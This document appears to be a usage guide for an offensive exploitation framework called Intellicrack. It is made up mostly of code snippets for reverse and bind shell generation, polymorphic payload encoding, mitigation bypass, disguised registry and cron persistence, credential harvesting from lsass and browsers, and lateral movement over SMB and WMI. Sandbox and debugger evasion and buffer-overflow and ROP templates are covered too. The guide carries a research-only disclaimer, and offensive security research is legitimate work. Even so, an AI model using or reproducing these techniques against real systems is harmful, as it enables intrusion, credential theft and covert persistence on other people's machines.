# Exploitation Framework Guide

## Overview

Intellicrack includes a comprehensive exploitation framework for security research and vulnerability analysis. This guide covers the exploitation modules, bypass techniques, and payload generation capabilities.

**⚠️ WARNING**: This framework is for authorized security research only. Never use these tools on systems you don't own or without explicit permission.

## Core Components

### 1. Bypass Engines

Located in `intellicrack/core/exploitation/` and `intellicrack/core/mitigation_bypass/`

#### ASLR (Address Space Layout Randomization) Bypass
```python
from intellicrack.core.exploitation import ASLRBypass

# Initialize ASLR bypass engine
aslr_bypass = ASLRBypass()

# Analyze binary for ASLR weaknesses
vulnerabilities = aslr_bypass.analyze(target_binary)

# Generate bypass strategy
bypass_strategy = aslr_bypass.generate_bypass(vulnerabilities)
```

#### DEP (Data Execution Prevention) Bypass
```python
from intellicrack.core.exploitation import DEPBypass

# ROP chain generation for DEP bypass
dep_bypass = DEPBypass()
rop_chain = dep_bypass.generate_rop_chain(binary_path)
```

#### Stack Canary Bypass
```python
from intellicrack.core.exploitation import StackCanaryBypass

# Detect and bypass stack canaries
canary_bypass = StackCanaryBypass()
canary_value = canary_bypass.leak_canary(process_handle)
```

### 2. Shellcode Generation

The shellcode generator creates position-independent code for various purposes:

```python
from intellicrack.core.exploitation import ShellcodeGenerator

generator = ShellcodeGenerator()

# Generate reverse shell
shellcode = generator.generate(
    payload_type="reverse_shell",
    options={
        "lhost": "192.168.1.100",
        "lport": 4444,
        "platform": "windows/x64"
    }
)

# Generate bind shell
bind_shell = generator.generate(
    payload_type="bind_shell",
    options={
        "lport": 8080,
        "platform": "linux/x86"
    }
)
```

### 3. Payload Engine

Advanced payload generation with encoding and obfuscation:

```python
from intellicrack.core.exploitation import PayloadEngine

engine = PayloadEngine()

# Create encoded payload
payload = engine.create_payload(
    shellcode=raw_shellcode,
    encoder="xor",
    bad_chars=[0x00, 0x0a, 0x0d],
    iterations=3
)

# Polymorphic payload generation
poly_payload = engine.create_polymorphic(
    template="reverse_tcp",
    mutation_rate=0.3
)
```

### 4. Exploit Development Workflow

#### Step 1: Vulnerability Analysis
```python
# Analyze binary for vulnerabilities
from intellicrack.core.analysis import VulnerabilityAnalyzer

analyzer = VulnerabilityAnalyzer()
vulns = analyzer.scan_binary(target_file)

# Common vulnerability types detected:
# - Buffer overflows
# - Format string bugs
# - Integer overflows
# - Use-after-free
# - Race conditions
```

#### Step 2: Exploit Planning
```python
from intellicrack.core.exploitation import ExploitPlanner

planner = ExploitPlanner()
exploit_plan = planner.create_plan(
    vulnerability=vulns[0],
    target_os="windows",
    protections=["aslr", "dep", "stack_canary"]
)
```

#### Step 3: Exploit Generation
```python
from intellicrack.core.exploitation import ExploitBuilder

builder = ExploitBuilder()
exploit = builder.build(
    plan=exploit_plan,
    payload=shellcode,
    return_address=0x41414141
)
```

## Persistence Mechanisms

### Windows Persistence
```python
from intellicrack.core.exploitation import WindowsPersistence

persistence = WindowsPersistence()

# Registry persistence
persistence.add_registry_key(
    hive="HKLM",
    key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    name="SecurityUpdate",
    value="C:\\Windows\\Temp\\update.exe"
)

# Scheduled task persistence
persistence.create_scheduled_task(
    name="SystemMaintenance",
    executable="C:\\Windows\\Temp\\maintain.exe",
    trigger="onboot"
)
```

### Linux Persistence
```python
from intellicrack.core.exploitation import LinuxPersistence

persistence = LinuxPersistence()

# Cron persistence
persistence.add_cron_job(
    schedule="@reboot",
    command="/tmp/.hidden/backdoor"
)

# Systemd service
persistence.create_systemd_service(
    name="system-monitor",
    executable="/usr/local/bin/monitor"
)
```

## Credential Harvesting

```python
from intellicrack.core.exploitation import CredentialHarvester

harvester = CredentialHarvester()

# Memory credential extraction
creds = harvester.extract_from_memory(process_name="lsass.exe")

# Registry credential extraction
saved_creds = harvester.extract_from_registry()

# Browser credential extraction
browser_creds = harvester.extract_browser_passwords()
```

## Privilege Escalation

```python
from intellicrack.core.exploitation import PrivilegeEscalation

privesc = PrivilegeEscalation()

# Windows privilege escalation
windows_vulns = privesc.find_windows_vulns()
for vuln in windows_vulns:
    if vuln.exploitable:
        privesc.exploit(vuln)

# Linux privilege escalation
linux_vulns = privesc.find_linux_vulns()
# Checks for: SUID binaries, kernel exploits, misconfigurations
```

## Lateral Movement

```python
from intellicrack.core.exploitation import LateralMovement

lateral = LateralMovement()

# SMB lateral movement
lateral.smb_exec(
    target="192.168.1.50",
    username="admin",
    password="password123",
    command="whoami"
)

# WMI lateral movement
lateral.wmi_exec(
    target="192.168.1.51",
    command="powershell.exe -enc <base64>"
)
```

## Anti-Analysis Bypass

### Anti-Debugging Bypass
```python
from intellicrack.core.anti_analysis import DebuggerDetector

detector = DebuggerDetector()
bypass_hooks = detector.generate_bypass_hooks()

# Apply hooks via Frida
frida_script = detector.to_frida_script(bypass_hooks)
```

### VM Detection Bypass
```python
from intellicrack.core.anti_analysis import VMDetector

vm_detector = VMDetector()
vm_artifacts = vm_detector.detect_artifacts()
bypass_patches = vm_detector.generate_patches(vm_artifacts)
```

## Payload Templates

Intellicrack includes various payload templates in `intellicrack/core/exploitation/payload_templates.py`:

1. **Reverse Shells**: TCP, HTTP, HTTPS, DNS
2. **Bind Shells**: TCP, UDP
3. **Meterpreter**: Staged and stageless
4. **Custom Loaders**: Reflective DLL, Process Hollowing
5. **Fileless**: PowerShell, WMI, Living off the Land

## Safety Features

### Simulation Mode
```python
# Test exploits safely without execution
engine.simulation_mode = True
result = engine.test_exploit(exploit_code)
```

### Sandbox Detection
```python
# Automatically detect if running in sandbox
if engine.detect_sandbox():
    print("Running in sandbox - limiting operations")
    engine.safe_mode = True
```

## Integration with Main UI

Access exploitation features through:
1. **Tools → Exploitation Framework**
2. **Analysis → Vulnerability Scanner**
3. **Tools → Payload Generator**

## Best Practices

1. **Always test in isolated environments**
2. **Use simulation mode first**
3. **Log all operations for analysis**
4. **Implement proper OPSEC**
5. **Follow responsible disclosure**

## Common Workflows

### Basic Buffer Overflow Exploitation
```python
# 1. Find overflow
overflow_offset = analyzer.find_overflow_offset(binary)

# 2. Control EIP/RIP
exploit = "A" * overflow_offset + struct.pack("<I", return_address)

# 3. Add shellcode
exploit += "\x90" * 16 + shellcode

# 4. Test in debugger first
debugger.load(binary)
debugger.set_input(exploit)
```

### ROP Chain Construction
```python
# Find gadgets
gadgets = rop_generator.find_gadgets(binary)

# Build chain
chain = ROPChain()
chain.add_gadget(gadgets["pop_rdi"])
chain.add_value(0x1337)
chain.add_gadget(gadgets["system"])
```

## Limitations

- Some bypasses require kernel-level access
- UEFI/BIOS level protections cannot be bypassed
- Modern exploit mitigations may require creative approaches
- Legal restrictions apply - research only

## Troubleshooting

### "Exploit failed" errors
1. Check target architecture matches payload
2. Verify bad characters are filtered
3. Ensure proper encoding is applied
4. Test with debugger attached

### "Access denied" errors
1. Some operations require administrator privileges
2. AV may be blocking operations
3. Target process may have additional protections
